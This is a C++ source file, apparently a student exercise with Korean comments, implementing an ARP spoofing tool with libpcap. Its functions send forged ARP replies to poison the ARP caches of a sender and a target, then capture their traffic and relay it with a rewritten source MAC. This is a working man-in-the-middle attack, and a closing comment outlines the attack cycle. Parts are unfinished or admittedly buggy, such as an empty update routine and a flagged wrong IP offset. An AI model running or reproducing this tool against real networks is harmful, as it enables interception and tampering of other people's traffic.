#include <cstdio>
#include <pcap.h>
#include <cstring>
#include "ethhdr.h"
#include "arphdr.h"

#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>

#include <map>
using namespace std;
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};

struct ArpInfo{
    Mac mac_;
    Ip ip_;
};


void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void get_my_mac(char * interface, unsigned char * mac) {
    int sock = socket(PF_INET, SOCK_DGRAM, 0);
    struct ifreq req;

    if (sock < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&req, 0, sizeof(req));
    strncpy(req.ifr_name, interface, IF_NAMESIZE - 1);

    if (ioctl(sock, SIOCGIFHWADDR, &req) < 0) {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }
    memcpy(mac, (unsigned char *)req.ifr_hwaddr.sa_data, 6);

    close(sock);
}

void get_my_ip(char * interface, char* ip_buffer){
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);

    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    sprintf(ip_buffer,"%s", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
}

void make_arp_packet(EthArpPacket* buf, uint8_t smac[], uint32_t sip, uint8_t tmac[], uint32_t tip, int op){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(tmac);
    packet.eth_.smac_ = Mac(smac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(op);
    packet.arp_.smac_ = Mac(smac);
    packet.arp_.sip_ = htonl(Ip(sip));
    if(op == ArpHdr::Request) memset(tmac, 0 ,6);
    packet.arp_.tmac_ = Mac(tmac);
    packet.arp_.tip_ = htonl(Ip(tip));

    memcpy(buf, &packet, sizeof(EthArpPacket));
}

void send_arp_packet(pcap_t * handle, EthArpPacket * packet){
    int res = pcap_sendpacket(handle, reinterpret_cast<const uint8_t *>(packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

void infect_arp_table(pcap_t * handle, ArpInfo* sender, ArpInfo* I, char * ip, Ip target){
    // 브로드 캐스트를 보내고 (arp request) 이를 잡아서 정보를 업데이트. 업데이트 하는 시점은 , 인자로 주어진 ip에 대한 정보가 존재하지 않을때?(key-value)로 저장해야하나?
    EthArpPacket arp_packet;
    Mac smac = Mac("FF:FF:FF:FF:FF:FF");
    Ip sip = Ip(ip);

    make_arp_packet(&arp_packet, I->mac_, I->ip_, smac, sip, ArpHdr::Request);
    send_arp_packet(handle, &arp_packet);
    printf("1...\n");
    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet); // 잡은 패킷에 대해 맥이랑 ip만 바꿔주면 된다
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        EthArpPacket * arp_reply_packet = (EthArpPacket *)packet;

        if(arp_reply_packet->eth_.type() == EthHdr::Arp){ // arp_reply_packet->arp_.op() == ArpHdr::Reply) {
            memcpy(&arp_packet, arp_reply_packet, sizeof(EthArpPacket));
            break;
        }
        printf("2...\n");
    }
    sender->mac_ = arp_packet.eth_.smac_;
    sender->ip_ = arp_packet.arp_.sip();

    make_arp_packet(&arp_packet, I->mac_, target, sender->mac_, sender->ip_, ArpHdr::Reply);
    send_arp_packet(handle, &arp_packet);
    printf("3...\n");
}

bool check_arp_packet(const u_char* packet){
    uint16_t type;
    memcpy(&type, (uint16_t*)(packet + 12), 2);
    if(ntohs(type) == EthHdr::Arp){
        return true;
    }
    return false;
}

void relay_packet(pcap_t * handle, const u_char* packet, ArpInfo I, bpf_u_int32 caplen){
    printf("Packet Relay...\n");
    memcpy((u_char *) (packet + 6), &(I.mac_), 6);
    printf("%02X:%02X:%02X:%02X:%02X:%02X\n", packet[6], packet[7], packet[8], packet[9], packet[10], packet[11]);
    int res = pcap_inject(handle, reinterpret_cast<const uint8_t *>(packet), caplen);
    printf("packet inject: %d bytes\n", res);
    if (res == 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

}



void update_arp_table(ArpInfo sender, ArpInfo target, ArpInfo attacker){ // reply 패킷만 보내는 용도!!
    //make_arp_packet();
    //send_arp_packet();
    //make_arp_packet();
    //send_arp_packet();
}

void print_ip(uint32_t ip){
    uint8_t to[4];
    memcpy(to, &ip, 4);
    printf("%u.%u.%u.%u\n", to[0],to[1],to[2],to[3]);
}


int main(int argc, char * argv[]) {
    if(argc < 3 || argc % 2 != 0){
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if(handle == nullptr){
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    map<Ip,Mac> ArpTable;

    ArpInfo I;
    get_my_mac(argv[1], I.mac_);
    // 고쳐야 할 곳 ********
    char ip_buffer[18];
    get_my_ip(argv[1], ip_buffer);
    I.ip_ = Ip(ip_buffer);

    EthArpPacket arp_packet;
    ArpInfo sender;
    ArpInfo target;

    Ip temp1 = Ip(argv[3]);
    Ip temp2 = Ip(argv[5]);

    infect_arp_table(handle, &sender, &I, argv[2], temp1);
    printf("where is...\n");
    infect_arp_table(handle, &target, &I, argv[4], temp2);
    printf("Infect Arp Table Success...\n");

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet); // 잡은 패킷에 대해 맥이랑 ip만 바꿔주면 된다
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        if(check_arp_packet(packet)){
            printf("Capture Arp Packet...\n");
            //update_arp_table
            continue;
        }
        uint32_t check_ip;

        memcpy(&check_ip, (packet + 26), 4); //ip의 위치가 틀렸다!
        //printf("Captured Packet IP:%s\n", inet_ntoa(check_ip));
        printf("Packet IP: ");
        print_ip(check_ip);
        printf("Check Ip...\n");

        if(htonl(check_ip) == sender.ip_ || htonl(check_ip) == target.ip_) // if ip is in arp_table
            relay_packet(handle, packet, I, header->caplen); //센더 mac만 바꿔주면 된다.

    }


    pcap_close(handle);


}




/*
 1. arp table attack(send-arp) sender & target 둘 다 감염
 2. get spoofed packet
 3. send relay packet
 4. (In NAT, this is rare) target send to sender arp request(broadcast)
 5. arp cache expired -> sender send arp request(broadcast)
 6. sender send unicast
 7. redo 1!!

 그러나 여러 센더와 타겟을 관리해야 하는 어려움 존재한다.
 */